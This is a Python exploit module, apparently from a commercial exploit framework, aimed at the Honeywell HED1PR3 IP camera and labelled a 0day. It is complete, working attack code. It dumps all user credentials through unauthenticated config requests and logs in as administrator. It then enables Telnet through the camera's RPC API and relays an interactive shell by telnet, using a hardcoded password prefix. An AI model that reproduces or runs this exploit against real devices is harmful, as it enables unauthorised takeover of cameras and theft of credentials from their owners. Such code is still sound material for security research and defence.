#!/usr/bin/env python

import urllib2
import json
import ssl
import telnetlib
import socket
import re

from collections import OrderedDict

from Sploit import Sploit

INFO = {}
INFO['NAME'] = "efa_honeywell_hed1pr3_ipcamera_info_disclosure"
INFO['DESCRIPTION'] = "Honeywell HED1PR3 IP Camera Information Disclosure"
INFO['VENDOR'] = "https://www.honeywell.com/"
INFO["CVE Name"] = "0day"
INFO["NOTES"] = """
    Specially crafted GET request allows to get users' credentials.
Tested against Honeywell HED1PR3 firmware v1.000.HW00.0.R
    """
INFO["DOWNLOAD_LINK"] = ""
INFO["LINKS"] = []
INFO['CHANGELOG']="26 Feb, 2016. Written by Gleg team."
INFO['PATH'] = "General/"

# Must be in every module, to be set by framework
OPTIONS = OrderedDict()
OPTIONS["HOST"] = "192.168.1.108"
OPTIONS["PORT"] = 443


class exploit(Sploit):
    def __init__(self,host="",
                port=0, ssl=False,
                logger=None):
        Sploit.__init__(self, logger=logger)

    def args(self):
        self.args = Sploit.args(self, OPTIONS)
        self.host = self.args.get("HOST", OPTIONS["HOST"])
        self.port = self.args.get("PORT", OPTIONS["PORT"])
        if self.args['listener']:
            self.listener_port = self.args['listener']['PORT']
        else:
            self.log("[-] Please enable listener to recieve connect back from telnet")
            self.finish(False)
        self.context = ssl._create_unverified_context()

    def make_url(self, path=''):
        url = "https://%s:%s/%s" % (self.host, self.port, path)
        return url

    def make_req(self, path='', data=None, headers={}):
        url = self.make_url(path)
        if data:
            req = urllib2.Request(url, json.dumps(data), headers=headers)
            res = urllib2.urlopen(req, context=self.context)
        else:
            res = urllib2.urlopen(url, context=self.context)
        return res.read()

    def make_table(self, header=None, data=None):
        tmp = [header] + data
        max_fields_width = []
        for i in range(len(header)):
            try:
                max_fields_width.append(len(max(tmp, key=lambda x: len(x[i]))[i]) + 3)
            except Exception as e:
                print e
        horizontal = '+' + '+'.join('-' * width for width in max_fields_width) + '+\r\n'
        output = '\r\n' + horizontal
        output += '|' + '|'.join(header[i].center(width) for i, width in enumerate(max_fields_width)) + '|\r\n'
        output += horizontal
        sorted_data = sorted(data)
        for entry in sorted_data:
            output += '|' + '|'.join(entry[i].ljust(width) for i, width in enumerate(max_fields_width)) + '|\r\n'
        output += horizontal
        return output

    def extract_fields(self, header, data):
        def extract(entry):
            return [str(entry[field]) for field in header]
        return [extract(entry) for entry in data]

    def check(self):
        self.log("[*] Trying to connect to {}:{}".format(self.host, self.port))
        self.make_req()

    def get_creds(self):
        self.log('[*] Retrieving users...')
        creds = self.make_req('current_config/Account1')
        encrypted_creds = json.loads(creds[creds.find('{'):])
        creds = self.make_req('current_config/Sha1Account1')
        clean_creds = json.loads(creds[creds.find('{'):])
        # self.log(encrypted_creds)
        groups = self.extract_fields(['Id', 'Name', 'Memo'], clean_creds['Groups'])
        users = self.extract_fields(['Id', 'Group', 'Name', 'Password'], clean_creds['Users'])
        admin_group = max(clean_creds['Groups'], key=lambda x: len(x['AuthorityList']))
        self.log('[+] Available groups:')
        self.log(self.make_table(['Id', 'Name', 'Memo'], groups))
        self.log('[+] Available users:')
        self.log(self.make_table(['Id', 'Group', 'Name', 'Password'], users))
        admin_acc = filter(lambda entry: entry['Group'] == admin_group['Name'], clean_creds['Users']).pop()
        self.log('[+] Found admin\'s account: %s:%s' % (admin_acc.get('Name'), admin_acc.get('Password')))
        return admin_acc

    def login_to_camera(self, admin_acc):
        self.log('[*] Trying to login...')
        data = {
            "method":"global.login",
            "params":{
                "userName":admin_acc['Name'],
                "password":"",
                "clientType":"Web3.0"
            },
            "id":10000}
        res = self.make_req('RPC2_Login', data)
        res = json.loads(res)
        session = res['session']
        data = {"method":"global.login",
                "session":int(session),
                "params":{
                    "userName":admin_acc['Name'],
                    "password":admin_acc['Password'],
                    "clientType":"Web3.0"
                },
                "id":10000}
        res = self.make_req('RPC2_Login', data)
        res = json.loads(res)
        if 'error' in res:
            self.log('[-] Can\'t login')
            self.finish(False)
        self.log('[+] Successfully logged in')
        data = {"method":"configManager.setConfig",
                "params":
                    {
                        "name":"Telnet",
                        "table":{"Enable":True}
                    },
                "session":session,
                "id":1000}
        headers = {'Cookie': 'DhWebClientSessionID=%s;' % session}
        res = self.make_req('RPC2', data, headers)
        res = json.loads(res)
        if not res.get('result'):
            self.log('[-] Telnet is not enabled')
            self.finish(True)
        self.log('[+] Telnet successfully enabled')

    def connect_via_telnet(self, login, password):
        self.log('[*] Connecting via telnet...')
        tn = telnetlib.Telnet(self.host, 23, 3)
        s = socket.socket()
        pattern = '# '
        r = re.compile("\033\[[0-9;]+m")
        s.connect(('127.0.0.1', self.listener_port))
        s.sendall(tn.read_until("login: "))
        tn.write(str(login) + "\n")
        s.sendall(tn.read_until("Password: "))
        tn.write(str("7ujMko0" + password + "\n"))
        data = tn.read_until(pattern)
        s.send(data)
        # wait for command from listener
        while 1:
            data = s.recv(1024)
            if data.startswith('exit'):
                break
            tn.write(data)
            data = tn.read_until(pattern)
            data = r.sub("", data)
            s.send(data)

    def run(self):
        #Get options from gui
        self.args()
        self.check()
        admin_acc = self.get_creds()
        self.login_to_camera(admin_acc)
        self.connect_via_telnet(admin_acc['Name'], admin_acc['Password'])
        self.finish(True)


if __name__ == '__main__':
    """
    By now we only have the tool
    mode for exploit..
    Later we would have
    standalone mode also.
    """
    print "Running exploit %s .. " % INFO['NAME']
    e = exploit("192.168.0.1",80)
    e.run()
